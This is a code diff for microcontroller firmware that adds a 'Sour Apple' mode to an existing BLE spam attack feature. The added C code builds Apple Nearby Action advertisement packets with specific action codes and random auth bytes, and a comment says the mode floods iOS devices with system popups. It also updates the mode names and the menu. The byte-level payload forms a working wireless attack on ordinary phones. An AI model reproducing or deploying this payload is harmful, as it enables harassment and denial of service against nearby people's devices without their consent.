@@ -146,13 +146,14 @@ static bt_device_info_t bt_devices[BT_MAX_DEVICES];
 static int bt_device_count = 0;
 
 // BLE Spam attack state
-#define BLE_SPAM_MODE_APPLE    0
-#define BLE_SPAM_MODE_SAMSUNG  1
-#define BLE_SPAM_MODE_GOOGLE   2
-#define BLE_SPAM_MODE_WINDOWS  3
-#define BLE_SPAM_MODE_ALL      4
-#define BLE_SPAM_MODE_AIRTAG   5
-#define BLE_SPAM_MODE_SMARTTAG 6
+#define BLE_SPAM_MODE_APPLE       0
+#define BLE_SPAM_MODE_SAMSUNG     1
+#define BLE_SPAM_MODE_GOOGLE      2
+#define BLE_SPAM_MODE_WINDOWS     3
+#define BLE_SPAM_MODE_ALL         4
+#define BLE_SPAM_MODE_AIRTAG      5
+#define BLE_SPAM_MODE_SMARTTAG    6
+#define BLE_SPAM_MODE_SOUR_APPLE  7
 static volatile bool ble_spam_active = false;
 static TaskHandle_t ble_spam_task_handle = NULL;
 static lv_obj_t *ble_spam_status_label = NULL;
@@ -5856,10 +5857,10 @@ void app_main(void)
                 if (ble_spam_status_label && lv_obj_is_valid(ble_spam_status_label)
                     && ble_spam_active) {
                     static const char *s_mode_names[] = {
-                        "Apple", "Samsung", "Google", "Windows", "All",
-                        "Apple Find My", "Samsung SmartTag"
+                        "Apple Prox. Pair", "Samsung", "Google", "Windows", "All",
+                        "Apple Find My", "Samsung SmartTag", "Sour Apple"
                     };
-                    int m = (ble_spam_mode >= 0 && ble_spam_mode <= 6) ? ble_spam_mode : 4;
+                    int m = (ble_spam_mode >= 0 && ble_spam_mode <= 7) ? ble_spam_mode : 4;
                     char sbuf[48];
                     snprintf(sbuf, sizeof(sbuf), "Sending: %s", s_mode_names[m]);
                     lv_label_set_text(ble_spam_status_label, sbuf);
@@ -23016,7 +23017,7 @@ static void ble_spam_task(void *pvParameters)
 {
     (void)pvParameters;
     int apple_idx = 0, samsung_idx = 0, google_idx = 0, windows_idx = 0;
-    int airtag_idx = 0, smarttag_idx = 0;
+    int airtag_idx = 0, smarttag_idx = 0, sour_apple_idx = 0;
     int mode_round = 0; // cycles through modes when ALL
 
     while (ble_spam_active) {
@@ -23043,9 +23044,10 @@ static void ble_spam_task(void *pvParameters)
             static const int all_modes[] = {
                 BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
                 BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
-                BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG
+                BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
+                BLE_SPAM_MODE_SOUR_APPLE
             };
-            cur_mode = all_modes[mode_round % 6];
+            cur_mode = all_modes[mode_round % 7];
             mode_round++;
         }
 
@@ -23053,6 +23055,7 @@ static void ble_spam_task(void *pvParameters)
         const uint8_t *svc_data = NULL;
         uint8_t svc_data_len = 0;
         uint8_t at_mfg[29]; // AirTag Find My manufacturer data buffer
+        uint8_t sa_mfg[9];  // Sour Apple Nearby Action buffer
 
         switch (cur_mode) {
         case BLE_SPAM_MODE_APPLE:
@@ -23099,6 +23102,24 @@ static void ble_spam_task(void *pvParameters)
             svc_data_len = sizeof(s_smarttag_payloads[0]);
             smarttag_idx = (smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
             break;
+        case BLE_SPAM_MODE_SOUR_APPLE: {
+            // Apple Nearby Action (0x0F) — different from Proximity Pairing (0x10).
+            // Cycling through action types floods iOS with system-level popups:
+            // device setup, AirDrop, HomePod, Apple Watch pairing, AirPlay, Handoff.
+            static const uint8_t sa_actions[] = {
+                0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
+            };
+            sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;   // Apple company ID
+            sa_mfg[2] = 0x0F;                        // Nearby Action type
+            sa_mfg[3] = 0x05;                        // action data length
+            sa_mfg[4] = 0xC1;                        // action flags
+            sa_mfg[5] = sa_actions[sour_apple_idx % (int)sizeof(sa_actions)];
+            sour_apple_idx++;
+            esp_fill_random(&sa_mfg[6], 3);          // random auth tag
+            fields.mfg_data     = sa_mfg;
+            fields.mfg_data_len = sizeof(sa_mfg);
+            break;
+        }
         case BLE_SPAM_MODE_WINDOWS:
         default:
             use_svc = true;
@@ -23197,7 +23218,7 @@ static void show_ble_spam_screen(void)
     lv_obj_align(mode_lbl, LV_ALIGN_TOP_LEFT, 8, 38);
 
     lv_obj_t *dd = lv_dropdown_create(function_page);
-    lv_dropdown_set_options(dd, "Apple (Sour Apple)\nSamsung Fast Connect\nGoogle Fast Pair\nWindows Swift Pair\nAll Platforms\nApple Find My (AirTag)\nSamsung SmartTag");
+    lv_dropdown_set_options(dd, "Apple Prox. Pair\nSamsung Fast Connect\nGoogle Fast Pair\nWindows Swift Pair\nAll Platforms\nApple Find My (AirTag)\nSamsung SmartTag\nSour Apple (iOS Popups)");
     lv_dropdown_set_selected(dd, (uint16_t)ble_spam_mode);
     lv_obj_set_size(dd, lv_pct(96), 36);
     lv_obj_align(dd, LV_ALIGN_TOP_MID, 0, 58);
